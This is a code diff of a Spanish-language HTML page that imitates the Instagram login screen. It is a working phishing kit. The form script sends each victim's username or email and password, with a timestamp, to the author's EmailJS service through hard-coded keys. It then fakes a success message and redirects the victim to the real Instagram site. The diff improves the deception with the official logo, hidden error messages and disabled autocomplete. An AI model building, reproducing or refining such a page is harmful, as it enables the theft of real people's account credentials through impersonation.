@@ -4,10 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <!-- Icono de Instagram -->
-   
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.svg/2048px-Instagram_icon.svg.png" alt="Instagram" width="50">
-  
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("q1IUmbgdFeBvmxnvi"); // <--- IMPORTANTE: Pega aquí tu Public Key de EmailJS
+       })();
+    </script>
+
     <style>
         body {
             background-color: #fafafa;
@@ -24,16 +28,17 @@
             padding: 40px;
             width: 350px;
             text-align: center;
-        }
-        h2 {
-            font-family: 'Segoe UI', sans-serif;
-            margin: 0 0 20px 0;
-            font-size: 24px;
-            color: #262626;
+            box-sizing: border-box;
         }
         .logo {
             width: 175px;
-            margin-bottom: 20px;
+            margin: 0 0 30px 0;
+        }
+        h2 {
+            font-size: 16px;
+            color: #8e8e8e;
+            font-weight: 600;
+            margin: 0 0 20px 0;
         }
         input {
             width: 100%;
@@ -57,109 +62,118 @@
             padding: 7px;
             border-radius: 4px;
             font-weight: 600;
-            font-size: 14px;
             cursor: pointer;
             margin-top: 10px;
+            position: relative;
         }
         button:hover {
             background-color: #1877f2;
         }
         button:disabled {
             background-color: #bdedef;
+            color: white;
             cursor: default;
         }
-        .footer {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #8e8e8e;
-        }
-        .footer a {
-            color: #003768;
-            text-decoration: none;
-        }
-        /* Spinner de carga */
         .spinner {
-            display: none;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3498db;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #0095f6;
             border-radius: 50%;
             width: 20px;
             height: 20px;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
+            animation: spin 2s linear infinite;
+            display: none;
+            margin: 0 auto;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            margin-left: -10px;
+            margin-top: -10px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+        .links {
+            margin-top: 15px;
+            font-size: 12px;
+        }
+        .links a {
+            color: #003768;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
 
     <div class="login-container">
-        <!-- Logo de Instagram -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.svg/2048px-Instagram_icon.svg.png" alt="Instagram" width="50">
+        <!-- LOGO CORREGIDO (URL estable) -->
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Instagram" class="logo">
         
-        <!-- Formulario -->
+        <h2>Iniciar sesión</h2>
+        
+        <!-- FORMULARIO -->
         <form id="login-form">
-            <input type="text" name="user_email" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
+            <!-- Campo usuario -->
+            <input type="text" name="user_email" id="user_email" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
             
-            <div class="spinner" id="spinner"></div>
+            <!-- Campo contraseña con autocomplete nuevo para evitar sugerencias de Google -->
+            <input type="password" name="password" id="password" placeholder="Contraseña" autocomplete="new-password" required>
             
-            <button type="submit" id="submit-btn">Iniciar sesión</button>
+            <button type="submit" id="submit-btn">
+                <span id="btn-text">Iniciar sesión</span>
+                <div class="spinner" id="spinner"></div>
+            </button>
         </form>
 
-        <div class="footer">
-            <a href="https://www.instagram.com/accounts/password/request/">¿Has olvidado la contraseña?</a>
+        <div class="links">
+            <a href="#">¿Has olvidado la contraseña?</a>
         </div>
     </div>
 
-    <!-- Scripts de EmailJS -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function(){
-            // Tu Public Key
-            emailjs.init("q1IUmbgdFeBvmxnvi"); 
-        })();
-    </script>
-
-    <script type="text/javascript">
+    <script>
         document.getElementById('login-form').addEventListener('submit', function(event) {
             event.preventDefault();
             
             var btn = document.getElementById('submit-btn');
             var spinner = document.getElementById('spinner');
+            var btnText = document.getElementById('btn-text');
             
-            // Deshabilitar botón y mostrar spinner
+            // UI Loading
             btn.disabled = true;
-            btn.innerText = "Verificando...";
+            btnText.style.opacity = '0';
             spinner.style.display = "block";
             
-            // Tus IDs
-            emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", this)
+            // Datos a enviar
+            var templateParams = {
+                user_email: document.getElementById('user_email').value,
+                password: document.getElementById('password').value,
+                // Opcional: fecha y hora
+                time: new Date().toLocaleString() 
+            };
+
+            // EmailJS Send
+            emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", templateParams)
                 .then(function() {
-                    // Éxito: Redirigir a Instagram
+                    // Éxito
                     spinner.style.display = "none";
-                    btn.innerText = "¡Éxito!";
-                    btn.style.backgroundColor = "#4CAF50"; // Verde
+                    btnText.style.opacity = '1';
+                    btn.style.backgroundColor = "#4CAF50"; // Verde éxito
+                    btnText.innerText = "¡Éxito!";
                     
                     setTimeout(function() {
                         window.location.href = "https://www.instagram.com";
-                    }, 1500); // 1.5 segundos de espera
+                    }, 1000); 
 
                 }, function(error) {
                     // Error
                     spinner.style.display = "none";
                     btn.disabled = false;
-                    btn.innerText = "Iniciar sesión";
-                    alert('Error: ' + JSON.stringify(error));
+                    btnText.style.opacity = '1';
+                    btnText.innerText = "Iniciar sesión";
+                    // Descomenta la línea de abajo si quieres ver el error en la consola
+                    // console.log('Error:', error);
                 });
         });
     </script>
-    <script>
-    // Fuerza al navegador a no autocompletar el campo de contraseña
-    document.querySelector('input[type="password"]').setAttribute('autocomplete', 'new-password');
-    </script>
 </body>
-  </html>
+                </html>
